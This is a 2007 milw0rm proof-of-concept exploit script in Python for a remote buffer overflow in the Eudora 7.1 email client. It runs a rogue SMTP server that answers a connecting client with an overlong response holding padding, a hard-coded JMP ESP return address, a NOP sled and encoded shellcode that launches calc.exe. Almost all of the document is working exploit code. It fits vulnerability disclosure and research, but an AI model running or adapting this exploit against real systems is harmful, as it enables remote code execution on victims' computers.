#!/usr/bin/python
# Eudora 7.1 SMTP Response 0day Remote Buffer Overflow PoC Exploit
# Bug discovered by Krystian Kloskowski (h07) <h07@interia.pl>
# Tested on Eudora 7.1.0.9 / XP SP2 Polish
# Shellcode type: Windows Execute Command (calc.exe)
# Note:..
# This vulnerability can be exploited only if user
# will ignore warning about "buffer overflow" error.
##

from struct import pack
from time import sleep
from socket import *

bind_addr = '0.0.0.0'
bind_port = 25

shellcode = (
"\x31\xc9\x83\xe9\xdb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd8"
"\x22\x72\xe4\x83\xeb\xfc\xe2\xf4\x24\xca\x34\xe4\xd8\x22\xf9\xa1"
"\xe4\xa9\x0e\xe1\xa0\x23\x9d\x6f\x97\x3a\xf9\xbb\xf8\x23\x99\x07"
"\xf6\x6b\xf9\xd0\x53\x23\x9c\xd5\x18\xbb\xde\x60\x18\x56\x75\x25"
"\x12\x2f\x73\x26\x33\xd6\x49\xb0\xfc\x26\x07\x07\x53\x7d\x56\xe5"
"\x33\x44\xf9\xe8\x93\xa9\x2d\xf8\xd9\xc9\xf9\xf8\x53\x23\x99\x6d"
"\x84\x06\x76\x27\xe9\xe2\x16\x6f\x98\x12\xf7\x24\xa0\x2d\xf9\xa4"
"\xd4\xa9\x02\xf8\x75\xa9\x1a\xec\x31\x29\x72\xe4\xd8\xa9\x32\xd0"
"\xdd\x5e\x72\xe4\xd8\xa9\x1a\xd8\x87\x13\x84\x84\x8e\xc9\x7f\x8c"
"\x28\xa8\x76\xbb\xb0\xba\x8c\x6e\xd6\x75\x8d\x03\x30\xcc\x8d\x1b"
"\x27\x41\x13\x88\xbb\x0c\x17\x9c\xbd\x22\x72\xe4")

opcode = 0x7CA58265 # JMP ESP (SHELL32.DLL / XP SP2 Polish)

buf = "250-"
buf += "A" * 76
buf += pack("<L", opcode)
buf += "\x90" * 32
buf += shellcode
buf += "\r\n"

s = socket(AF_INET, SOCK_STREAM)
s.bind((bind_addr, bind_port))
s.listen(1)
print "Listening on %s:%d..." % (bind_addr, bind_port)
cl, addr = s.accept()
print "Connected accepted from: %s" % (addr[0])
cl.send('220 Dupa Jasia\r\n')
print cl.recv(1024)[:-1]
cl.send(buf)
sleep(1)
cl.close()
s.close()
print "Done"

# EoF

# milw0rm.com [2007-05-15]
